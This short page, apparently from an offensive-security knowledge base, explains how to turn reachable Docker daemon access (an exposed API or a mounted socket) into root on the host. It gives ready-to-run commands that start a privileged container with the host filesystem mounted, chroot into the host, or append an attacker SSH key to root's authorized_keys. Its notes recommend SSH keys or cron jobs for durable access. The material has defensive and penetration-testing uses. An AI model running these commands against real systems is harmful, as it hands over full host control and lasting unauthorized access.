---
title: "Host takeover via privileged run: from daemon access to host root"
description: "Turning Docker daemon access into root on the host by using the daemon to start a new container that mounts the host filesystem and runs privileged, then chrooting in or writing host files, the standard payoff of any reachable daemon or mounted socket."
keywords:
  - docker privileged run
  - host takeover
  - daemon access
  - container breakout
  - chroot host
---

# Host takeover via privileged run

Any path to the daemon (an exposed API or a mounted socket) becomes host root the same way: ask the daemon to start a container that mounts the host root and runs privileged, then act on the host through it. The current container's privileges do not matter, because the daemon runs as root and creates the new container.

```bash
H=tcp://<host>:2375   # or unix:///var/run/docker.sock for a mounted socket
docker -H $H run -v /:/host --privileged -it alpine chroot /host sh

# Non-interactive: write a host cron job or SSH key
docker -H $H run -v /:/host alpine sh -c \
  'echo "ssh-ed25519 AAAA... attacker" >> /host/root/.ssh/authorized_keys'
```

## Exploitation notes

- The new container does the work: `-v /:/host` plus `--privileged` gives it the host filesystem and devices.
- Prefer writing an SSH key or cron job for durable access over an interactive chroot.
- This is the shared payoff of [Unauthenticated daemon access](unauthenticated-daemon-access.md), [Weak TLS on 2376](weak-tls-on-2376.md), and the mounted-socket escape [Runtime socket mount](../../../container-escape/sensitive-mounts/runtime-socket-mount.md).

## References

- [Docker Engine API](https://docs.docker.com/engine/api/)
- [Trail of Bits: Understanding Docker container escapes](https://blog.trailofbits.com/2019/07/19/understanding-docker-container-escapes/)
